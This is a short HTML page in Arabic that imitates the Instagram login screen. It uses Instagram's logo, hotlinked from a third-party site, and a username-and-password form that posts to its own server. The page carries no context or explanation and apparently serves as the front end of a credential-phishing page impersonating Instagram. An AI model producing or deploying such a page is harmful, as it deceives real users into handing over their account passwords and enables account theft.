<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل دخول انستقرام</title>
  <style>
    body {
      background: white;
      font-family: Tahoma, Arial, sans-serif;
      text-align: center;
      padding-top: 60px;
      direction: rtl;
    }
    .logo {
      width: 100px;
      height: auto;
      margin-bottom: 30px;
    }
    form {
      display: inline-block;
      text-align: right;
    }
    input[type="text"],
    input[type="password"] {
      width: 270px;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 15px;
      box-sizing: border-box;
    }
    button {
      width: 270px;
      background-color: #3897f0;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background-color: #2f81f7;
    }
  </style>
</head>
<body>

  <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo-500x281.png" alt="شعار انستقرام" class="logo">

  <form method="POST">
    <input type="text" name="username" placeholder="اسم المستخدم" required />
    <input type="password" name="password" placeholder="كلمة المرور" required />
    <button type="submit">تسجيل الدخول</button>
  </form>

</body>
</html>
